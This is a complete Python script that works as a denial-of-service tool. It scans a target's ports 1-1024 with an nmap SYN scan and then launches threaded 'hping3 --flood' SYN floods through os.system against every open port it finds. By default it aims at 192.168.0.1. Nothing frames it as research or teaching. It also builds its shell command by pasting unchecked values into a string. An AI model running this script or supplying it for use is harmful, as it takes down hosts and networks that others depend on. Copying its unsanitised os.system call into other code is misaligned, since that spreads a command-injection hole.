import os
import threading
import nmap


class DosWrapper:
    def __init__(self, target, port_range="1-1024", threads=5):
        self.target = target
        self.port_range = port_range
        self.threads = threads
        self.open_ports = []
        self.nm = nmap.PortScanner()

    def scan_ports(self):
        print(f"[+] Scanning open ports on {self.target} in range {self.port_range}")

        self.nm.scan(self.target, self.port_range, arguments='-sS -T4')

        # Parsing scan results for open ports
        for host in self.nm.all_hosts():
            print(f"[+] Host: {host}")
            for proto in self.nm[host].all_protocols():
                print(f"[+] Protocol: {proto}")
                ports = self.nm[host][proto].keys()
                for port in ports:
                    state = self.nm[host][proto][port]['state']
                    if state == 'open':
                        self.open_ports.append(port)
                        print(f"[+] Port {port} is OPEN")

        print(f"[+] Open ports: {self.open_ports}")

    def start_flood(self, port):
        print(f"[+] Starting SYN flood on {self.target}:{port}")
        try:
            os.system(f"sudo hping3 -S -p {port} --flood {self.target} > /dev/null 2>&1")
        except Exception as e:
            print(f"[!] Error starting flood on port {port}: {e}")

    def run(self):
        # Step 1: Scan for open ports
        self.scan_ports()
        threads = []

        try:
            # Step 2: Start flooding each open port
            for port in self.open_ports:
                if len(threads) >= self.threads:
                    print(f"Max threads spawned! Continue flooding {self.target}")
                    for t in threads:
                        t.join()  # Wait for all threads to complete
                    threads = []

                thrd = threading.Thread(target=self.start_flood, args=(port,))
                thrd.start()
                threads.append(thrd)

            for t in threads:
                t.join()  # Wait for the remaining threads to finish



        except KeyboardInterrupt:
            print("[+] Closing threads")
            for t in threads:
                t.join()
        finally:
            print("[+] All floods completed.")


if __name__ == "__main__":
    ddw = DosWrapper("192.168.0.1")
    ddw.run()
